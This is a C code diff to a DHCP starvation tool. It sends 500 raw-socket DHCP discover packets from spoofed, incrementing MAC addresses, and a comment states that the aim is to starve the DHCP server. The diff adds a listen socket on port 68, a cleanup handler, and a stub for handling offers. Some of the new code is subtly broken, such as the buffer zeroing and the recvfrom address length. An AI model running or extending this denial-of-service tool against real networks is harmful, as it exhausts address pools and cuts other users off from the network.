@@ -107,7 +107,7 @@ struct udphdr* get_udp_header(){
 /**
 * Properly prepare dhcp discover message, rfc2132
 */
-void make_discover(unsigned char* buffer, unsigned char* src_mac_addr){
+void make_discover(unsigned char* buffer, unsigned char* src_mac_addr, int type){
   // fill the buffer with zeros and fill only relevant values
   bzero(buffer, DHCP_BUFFER_SIZE);
   buffer[0] = (int) 1;      // Request 1
@@ -129,7 +129,7 @@ void make_discover(unsigned char* buffer, unsigned char* src_mac_addr){
   buffer[239] = (int) 99;             // MAGIC COOKIE end
   buffer[240] = (int) 53;             // OPTION defining dhcp message type
   buffer[241] = (int) 1;              // length of ^
-  buffer[242] = (int) 1;              // 1 == discover
+  buffer[242] = (int) type;              // 1 == discover
   buffer[243] = (int) 55;             // OPTION Requested items
   buffer[244] = (int) 4;              // length of ^
   buffer[245] = (int) 1;              // Subnet mask
@@ -139,13 +139,20 @@ void make_discover(unsigned char* buffer, unsigned char* src_mac_addr){
   buffer[249] = (int) 255;            //end
 }
 
+void cleanup(int sig) {
+  if (send_socket)              close(send_socket);
+  if (listen_socket)            close(listen_socket);
+  signal(sig, SIG_IGN);
+  exit(EXIT_SUCCESS);
+}
 
-int main(int argc, char** argv) {
+int main(int argc, char **argv) {
+  signal(SIGINT, cleanup);
   char* interface_name = checkArgs(argc, argv); // get name of the interface
   srand(time(NULL));  // pseudo generate IP id and DHCP transaction xid
-  int sd = 0;
-  if ((sd = socket (PF_PACKET, SOCK_RAW, IPPROTO_RAW)) < 0) {
-    err ("Failed to create socket", sd, 0);
+
+  if ((send_socket = socket (PF_PACKET, SOCK_RAW, IPPROTO_RAW)) < 0) {
+    err ("Failed to create socket", send_socket, 0);
   }
   uint8_t src_mac_addr[MAC_ADDR_LEN];  // initiate src mac adress
   uint8_t dst_mac_addr[MAC_ADDR_LEN];  // set dst mac for broadcast
@@ -181,6 +188,19 @@ int main(int argc, char** argv) {
 
   // place here only parts which depends on source MAC address, src mac address
   // has to be changed in every iteration to starve the dhcp server
+  if((listen_socket = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
+    err ("Failed to create SOCK_DGRAM", listen_socket, 0);
+  }
+  struct sockaddr_in srv;
+  bzero(&srv, sizeof(struct sockaddr_in));
+  srv.sin_family = AF_INET;
+  srv.sin_addr.s_addr = INADDR_ANY;     // dont care
+  srv.sin_port = htons(68);  // 68
+
+  if((bind(listen_socket, (struct sockaddr *)&srv, sizeof(srv))) < 0) {
+    err ("Failed to bind listen socket", ERR, 0);
+  }
+
   for (size_t i = 0; i < 500; i++) {
     increment_mac_addr(src_mac_addr);
     // Add mac address to interface which will be used to send msg out
@@ -188,17 +208,33 @@ int main(int argc, char** argv) {
     // copy MAC address to ETHERNET header
     memcpy(eth_frame + 6, src_mac_addr, 6 * sizeof(uint8_t));
     // include MAC address in DHCP discover message
-    make_discover(buffer, src_mac_addr);  // fill buffer with discover msg
+    make_discover(buffer, src_mac_addr, 1);  // fill buffer with discover msg
     // place the created DHCP discover to a msg buffer
     memcpy(eth_frame + ETH_HEADER_LEN + IP4_HEADER_LEN + UDP_HEADER_LEN, buffer, DHCP_BUFFER_SIZE * sizeof(uint8_t));
     // fire
     int sent = 0;
-    if ((sent = sendto (sd, eth_frame, eth_msg_len, 0, (struct sockaddr *)&interface, sizeof(interface))) <= 0) {
+    if ((sent = sendto (send_socket, eth_frame, eth_msg_len, 0, (struct sockaddr *)&interface, sizeof(interface))) <= 0) {
+      err("sendto() failed", sent, 0);
+    }
+    bzero(&buffer, DHCP_BUFFER_SIZE);
+    socklen_t length = sizeof(struct sockaddr_ll);
+    int rcvd = 0; // receive data and decive what to do
+    if((rcvd = recvfrom(listen_socket, buffer, DHCP_BUFFER_SIZE, 0, (struct sockaddr *)&interface, &length)) < 0) {
+      err("Err in recvfrom", rcvd, 0);
+    }
+    printf("received\n");
+    if (buffer[242] == 2) {
+      printf("TODO\n");
+    }
+    make_discover(buffer, src_mac_addr, 1);  // fill buffer with discover msg
+    memcpy(eth_frame + ETH_HEADER_LEN + IP4_HEADER_LEN + UDP_HEADER_LEN, buffer, DHCP_BUFFER_SIZE * sizeof(uint8_t));
+    sent = 0;
+    if ((sent = sendto (send_socket, eth_frame, eth_msg_len, 0, (struct sockaddr *)&interface, sizeof(interface))) <= 0) {
       err("sendto() failed", sent, 0);
     }
   }
-  if (close(sd) < 0) {
-    err("Failed to close the socket", sd, 0);
+  if ((close(send_socket) < 0) || (close(listen_socket) < 0)) {
+    err("Failed to close the socket", send_socket, 0);
   }
   free(udp_header);
   free(ip_header);
